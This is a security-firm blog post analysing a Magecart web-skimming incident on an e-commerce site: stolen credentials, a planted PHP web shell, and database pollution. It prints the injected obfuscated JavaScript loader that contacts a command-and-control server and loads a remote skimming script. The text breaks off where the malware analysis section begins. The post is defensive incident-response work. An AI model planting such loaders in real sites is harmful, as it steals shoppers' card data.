---
title: Inside the Attack: The Javascript Code Behind Credit Card Theft
url: https://labs.yarix.com/2025/04/inside-the-attack-the-javascript-code-behind-credit-card-theft/
source: Over Security - Cybersecurity news aggregator
date: 2025-04-18
fetch_date: 2025-10-06T22:06:23.789853
---

# Inside the Attack: The Javascript Code Behind Credit Card Theft

[![YLabs](//labs.yarix.com/wp-content/uploads/2025/01/Logo_Yarix.png)![YLabs](//labs.yarix.com/wp-content/uploads/2021/01/yarix_logo.png)![YLabs](//labs.yarix.com/wp-content/uploads/2025/01/Logo_Yarix.png)](https://labs.yarix.com/ "YLabs - Research & Development")

* [Home](https://labs.yarix.com/)
* [Blog](https://labs.yarix.com/category/blog/)
* [Advisories](https://labs.yarix.com/advisories/)
* [Careers](https://www.yarix.com/job-opportunity/)

# Inside the Attack: The Javascript Code Behind Credit Card Theft

* [Home](https://labs.yarix.com "Go to Home Page")
* Inside the Attack: The Javascript Code Behind Credit Card Theft

[Back to Posts](https://labs.yarix.com)

![](https://labs.yarix.com/wp-content/uploads/2050/01/copertina_articolo_analisi_javascript-1024x445.jpeg)

17Apr17/04/2025

## Inside the Attack: The Javascript Code Behind Credit Card Theft

[Ylabs](https://labs.yarix.com/author/ylabs/ "Posts by Ylabs")2025-04-17T17:23:23+02:00

By
[Ylabs](https://labs.yarix.com/author/ylabs/ "Posts by Ylabs")

Reading Time:   14 minutes

#

## Introduction

This paper will describe the analysis of a JavaScript script found during the activities of the Incident Response Team. The script found turned out to be designed to steal credit card data to exfiltrate sensitive information during online transactions on an e-commerce site. The script was later found to be connected to a type of attack known as “web skimming” or “Magecart,” and occurs when attackers inject malicious code into compromised e-commerce sites with the goal of intercepting payment data entered by users in checkout forms.

The article will provide a detailed analysis of the script, exploring how the code is obfuscated to evade security systems and how it handles and sends credit card data to remote servers controlled by the attackers. The various components of the script will be examined, including data collection functions, communication mechanisms with command-and-control (C&C) servers, and evasion techniques.

## Tactical Techniques and Procedures

This section will delve into the technique reconstructed by the team whereby the attacker managed to insert malicious JavaScript code inside the back-end of an e-commerce site. The strategy used is developed through several steps, each of them allows the attacker to gradually gain more and more control over the site and the server hosting the back-end, until the final goal of exfiltrating sensitive data is achieved.

![](https://labs.yarix.com/wp-content/uploads/porto_placeholders/100x15.jpg)

Figura 1-Attack steps

## Initial access

According to research by the Cyber Threat Intelligence team, the initial access to the website’s back-end occurred using credentials stolen through an infostealer, a particular type of malware designed to collect sensitive information from infected devices. This malware, once installed on the victims’ systems, is capable of stealing passwords, cookies, and other authentication data used to access web platforms and back-end managers.

![](https://labs.yarix.com/wp-content/uploads/porto_placeholders/100x23.jpg)

Figura 2-First back-end access

Once illicit access was gained to the back-end of the site, the attacker exploited the privileges gained to upload a malicious PHP page directly to the server. This PHP file acts as a web shell and allows the attacker to execute commands and gain complete remote control over the server, thereby bypassing normal access to the back-end manager. The inclusion of this PHP page allows the attacker to maintain a lasting persistence in the system, ensuring that the attacker can return to control the server even if the initial credentials were to be revoked or if security measures were strengthened.

![](https://labs.yarix.com/wp-content/uploads/porto_placeholders/100x26.jpg)

Figura 3-Persistent access

## Database access

During the investigation performed on the back-end of the website, the presence of a particular web shell customized by the attacker following the structural and operational logic of the open-source P.A.S. Fork v. 1.4 web shell, a particularly versatile tool for remote control of compromised servers, was found. This modified version allowed the attacker to exploit advanced features, such as direct interaction with the site’s database, which was critical to achieving his goals.

![](https://labs.yarix.com/wp-content/uploads/porto_placeholders/100x45.jpg)

![](https://labs.yarix.com/wp-content/uploads/porto_placeholders/100x54.jpg)

Figura 5 Active web shell example

This functionality allowed direct access and modification of database tables, without the need to go through the normal administrative flow of the site or content manager. Specifically, the attacker polluted a database row by introducing hidden malicious code.

This technique (database pollution) not only allowed the attacker to change the behavior of the site, but also provided even deeper persistence in the system, allowing malicious code to be executed whenever the website performed a read of the tampered row of its database.

![](https://labs.yarix.com/wp-content/uploads/porto_placeholders/100x34.jpg)

Figura 6- Database pollution

The attacker then inserted a malicious script within the database, the contents of which are given below:

> *<script>!function(t){if(localStorage.removeItem(“XsuHCYmfbgVSRFVx7SHRnU7DfapjFpaf”),null!==localStorage.getItem(“QIQWJJnh1Ckclw0jFr5KPME2M3kYHTyq”))return!1;fetch([\*\*,47,99,100,110,119,101,98,50,\*\*,110,97,108,121,116,105,\*\*,115,46,99,111,109].map((function(t){return String.fromCharCode(t)})).join(“”),{method:”POST”}).then((function(t){if(t.ok)return t.text()})).then((function(e){if(!e)return!1;try{let a=JSON.parse(e).response;if(“success”!==a.status)return!1;void 0!==a.data.socket&&localStorage.setItem(“XsuHCYmfbgVSRFVx7SHRnU7DfapjFpaf”,JSON.stringify(a.data.socket)),void 0!==a.data.handler&&localStorage.setItem(“XsuHCYmfbgVSRFVx7SHRnU7DfapjFpaf\_handler”,JSON.stringify(a.data.handler)),setTimeout((()=>{try{let e=t.createElement(“script”);e.setAttribute(“src”,a.data.script.map((function(t){return String.fromCharCode(t)})).join(“”)+(a.data.script.includes(“?”)?”&”:”?”)+”\_=”+(new Date).valueOf().toString().slice(0,-2)),t.head.appendChild(e)}catch(t){ }}),250)}catch(t){ }}))}(document);</script>*

The contained script has been identified as a fake “imager tag.” This type of script is designed to exploit the inclusion of seemingly innocuous HTML tags, such as those used to upload images, but which actually contain malicious code capable of performing malicious actions.

The fake imager tag exploits a manipulated <img> tag, in which a URL is inserted that invokes malicious code or sends requests to external servers controlled by the attacker. Specifically, inserting this script into the database allows the attacker to perform background operations whenever the tag is loaded from a page on the site.

The script is later used to inject additional payloads or dynamically modify site pages depending on conditions, increasing the effectiveness of the attack while maintaining control of the site and continuing data exfiltration undetected:

* XsuHCYmfbgVSRFVx7SHRnU7DfapjFpaf
* XsuHCYmfbgVSRFVx7SHRnU7DfapjFpaf\_handler

> *void 0!==a.data.socket&&localStorage.setItem(“XsuHCYmfbgVSRFVx7SHRnU7DfapjFpaf”,JSON.stringify(a.data.socket)),void 0!==a.data.handler&&localStorage.setItem(“XsuHCYmfbgVSRFVx7SHRnU7DfapjFpaf\_handler” JSON.stringify(a.data.handler))*

These two keys are particularly important in understanding the script to which this code refers because they will contain the url to which a WSS connection is established and the url of the attacker’s C&C server, respectively.

Following this is ultimately generated the script that performs the theft of the user’s credit cards at checkout.

## Malware Analysis

In this section, a static analysis of the malicious code contained in the script collected during the investigation of the last phase of the attack will be...